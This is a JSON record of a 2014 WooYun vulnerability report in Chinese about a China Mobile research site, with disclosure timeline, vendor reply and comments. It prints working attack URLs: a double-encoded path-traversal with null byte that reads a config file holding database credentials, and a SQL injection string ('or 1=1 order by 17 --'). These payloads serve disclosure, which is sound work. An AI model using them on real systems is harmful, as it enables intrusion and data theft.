{"id": 2613, "wybug_id": "wooyun-2014-064765", "wybug_title": "中国移动研究院任意文件读取及sql注入", "wybug_corp": "中国移动", "wybug_author": "menmen519", "wybug_date": "2014-06-13 15:42", "wybug_open_date": "2014-07-28 15:42", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "后台地址泄露", "用户"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向公众公开  简要描述： 中国移动研究院一个目录穿越+sql注入导致的血案，可拖站 详细说明：  什么都不多说了，直接访问：http://labs.chinamobile.com/imic/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fvar%252Fwww%252Fmobilehub%252Fwww%252Fincludes%252Fsettings.php%2500.jpg右键源码可以看到，数据库配置信息：\n\n这里的物理路径，是我一个个从其他php文件里面load出来的，从结果来看，只是一个简单的读文件操作，并没有文件包含，但是危险比较大，可以写一个脚本，然后爬取整个站点的源码，危害还是比较大下面这个是个sql注入：http://labs.chinamobile.com/zhanhui/show/qiye/id/' or 1=1 order by 17 -- /.com/cn大括号里面就是我们要注入的位置，我通过order by 发现这一个sql查询有17列，进一步操作这里就不多说了，可以两个漏洞利用起来，因为表前缀也有，所有的查询语句我们可以明明白白的看到，后续数据库的爆破也是很轻松的   漏洞证明：     修复方案：  对特殊字符进行过滤，特别是目录穿越的这种，sql的这种也要对特殊字符进行严格转义   版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-06-17 22:01 厂商回复： CNVD确认并复现所述情况（可跑库），已经转由CNCERT直接转报给中国移动集团公司，由其后续下发给直属单位处置，按多个漏洞进行评分，rank 15 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-13 15:55 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  传说中的权6站    \n     2014-06-13 16:55 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @超威蓝猫 什么意思     \n     2014-07-28 16:05 |    \t\txiaoxin \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:16        | 无)\t\t \n  @menmen519 pr    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}